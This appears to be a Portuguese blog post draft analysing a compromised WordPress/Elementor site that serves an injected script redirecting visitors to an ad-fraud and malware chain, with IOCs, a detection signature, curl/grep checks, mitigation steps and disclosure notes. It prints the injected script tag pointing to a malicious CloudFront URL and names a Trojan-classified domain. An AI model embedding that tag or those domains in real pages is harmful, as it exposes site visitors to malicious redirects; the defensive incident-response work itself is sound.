+++
date = '2026-08-01T00:00:00-04:00'
draft = true
title = 'Redirect Malicioso via Injeção Server-Side: Análise de Caso e Mitigação'
tags = ['wordpress', 'malware', 'incident-response', 'blue-team']
+++

**TL;DR:** Site WordPress/Elementor comprometido servindo script de terceiro injetado na origem (não edge/CDN, não client-side), redirecionando visitantes através de um TDS de ad-fraud. Confirmado via `curl` bruto: a origem entrega o payload. IOCs e passos de detecção/mitigação abaixo.

---

## Contexto

Site legítimo (**Site X** — nome retido até fix confirmado, disclosure em andamento) com botão de download redirecionando para destinos variáveis a cada clique. Investigação identificou script injetado no HTML servido, associado a domínio já classificado como malware por soluções de mercado.

## Cadeia de evidência

**1. Descartar sendBeacon como causa.** Tráfego de `POST`/`204` para domínio externo via `navigator.sendBeacon()` — API sem capacidade de navegação, apenas telemetria fire-and-forget. Sintoma, não causa.

**2. Descartar client-side.** Reprodução consistente em múltiplos dispositivos, redes (Wi-Fi/mobile), perfis limpos sem extensões. Elimina infecção local por controle de variáveis.

**3. Localizar injeção.**

```html
<script data-cfasync="false" src="//dpjf9a2rbjbvp.cloudfront.net/?afjpd=1253254"></script>
```

Fora do padrão de assets nativos da stack (WP emoji loader, Cloudflare Insights visíveis no mesmo bloco). `data-cfasync="false"` bypassa Cloudflare Rocket Loader — execução prioritária deliberada, não config incidental.

**4. Confirmar origem vs. edge.**

```bash
curl -sL -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" https://site-x.exemplo/ -o raw.html
grep -n "dpjf9a2rbjbvp\|cfasync" raw.html
```

Script presente na resposta HTTP crua (linha 129, imediatamente antes do meta generator do Elementor). Confirma injeção na origem — não CDN, não edge worker, não client rendering.

**5. Corroboração externa.** Domínio de destino observado (`aifpleasurebeh.org`) classificado como Trojan por Malwarebytes/ThreatDown.

## IOCs

| Tipo | Valor | Contexto |
|---|---|---|
| URL | `dpjf9a2rbjbvp.cloudfront.net/?afjpd=1253254` | Script de payload/redirect |
| Domain | `aifpleasurebeh.org` | Destino de redirect, malware confirmado |
| Padrão | `<script data-cfasync="false" src="//*.cloudfront.net/?*">` | Assinatura de injeção — subdomínio aleatório sobre infra cloud legítima |

Confiança: **A1** (evidência direta, curl + confirmação de fonte externa) para os IOCs acima. Vetor de infecção específico (plugin/hook/credencial) permanece **não confirmado** sem acesso ao servidor para validar.

## MITRE ATT&CK

- `T1189` — Drive-by Compromise
- `T1608.004` — Stage Capabilities: Drive-by Target

## Detecção — o que rodar agora

Se você administra WordPress e quer descartar o mesmo comprometimento:

```bash
# Grep local nos arquivos
grep -rn "cfasync=\"false\"" /path/to/wp-content /path/to/wp-includes

# Verificação de integridade core (via WP-CLI)
wp core verify-checksums

# Diff de hooks suspeitos em footer/head
grep -rn "wp_footer\|wp_head" wp-content/themes/*/functions.php
```

Bloqueio de rede/proxy: adicionar `dpjf9a2rbjbvp.cloudfront.net` e `aifpleasurebeh.org` a blocklists de DNS/firewall enquanto investiga origem.

## Mitigação, se confirmado

1. Isolar/backup do site antes de qualquer alteração (preservar evidência).
2. Remover a injeção identificada (arquivo/hook/entrada de banco).
3. Rotacionar TODAS as credenciais (admin, DB, SFTP/SSH) — assumir comprometimento total até prova contrária.
4. Atualizar core, tema e todos os plugins.
5. Auditar contas administrativas por usuários não reconhecidos.
6. WAF na frente (Cloudflare/Sucuri/Wordfence) para reduzir reexploração automatizada.
7. File integrity monitoring pós-remediação — detecção em horas, não meses, na próxima tentativa.

## Escopo e limitação

Coleta 100% passiva: DevTools, view-source, `curl` padrão. Sem acesso a painel administrativo, banco de dados, ou tentativa de exploração fora do escopo de research externo não autorizado. Vetor exato de comprometimento não confirmado por essa mesma razão.

## Disclosure

Reportado ao responsável do site, à Cloudflare (abuse, via `cf-ray`) e à AWS (abuse, via URL completa da CloudFront distribution — potencial de impacto em outros sites servidos pela mesma campanha). Nome do site a ser divulgado após fix confirmado ou expiração de prazo padrão de disclosure.
